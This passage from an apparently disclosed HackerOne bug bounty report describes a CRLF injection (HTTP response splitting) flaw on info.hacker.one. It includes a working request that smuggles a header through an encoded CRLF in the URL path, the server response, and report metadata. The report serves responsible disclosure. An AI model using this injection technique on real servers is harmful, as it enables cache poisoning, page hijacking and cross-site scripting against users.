If the user input is injected into the value section without properly escaping/removing CRLF characters it is possible to alter the HTTP headers structure.\nHTTP Response Splitting is a new application attack technique which enables various new attacks such as web cache poisoning, cross user defacement, hijacking pages with sensitive user information and cross-site scripting (XSS). The attacker sends a single HTTP request that forces the web server to form an output stream, which is then interpreted by the target as two HTTP responses instead of one response.\n\n\nURI was set to headername: headervalue\nInjected header found: \n\nheadername: headervalue\n\n\nRequest\nGET /%0d%0a%09headername:%20headervalue HTTP/1.1\nHost: info.hacker.one\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\n\nResponse\nHTTP/1.1 301 Moved Permanently\nDate: Wed, 29 Mar 2017 18:11:47 GMT\nLocation: http://info.hacker.one/\nheadername: headervalue/\nP3P: CP=\"This is not a privacy policy.\"\nX-Powered-By: Page Server II 2.1.117 bab5965\nX-Server-Instance: ps2-07ebf0a99d.ap-southeast-1.unbounce.net\nContent-Length: 0\nConnection: keep-alive\n\n\n","weakness":{"id":69,"name":"CRLF Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-03T17:06:13.399Z","allow_singular_disclosure_after":-140129972.99782524,"singular_disclosure_allowed":true,"vote_count":20,"voters":["rhynorater","iamnoooob","ankitsingh","mpz","eveeez","r3y","jackb898","0xradi","linkks","silv3rpoision","and 10 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1571188,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2017-03-29T18:23:05.218Z","updated_at":"2017-03-29T18:23:05.218Z","actor":{"username":"ubscott","cleared":false,"url":"/ubscott","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/140/001/0fb8afd21329384d188bfa3e78265c3534291190_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1571190,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'll check this out with the technical team that owns this service.
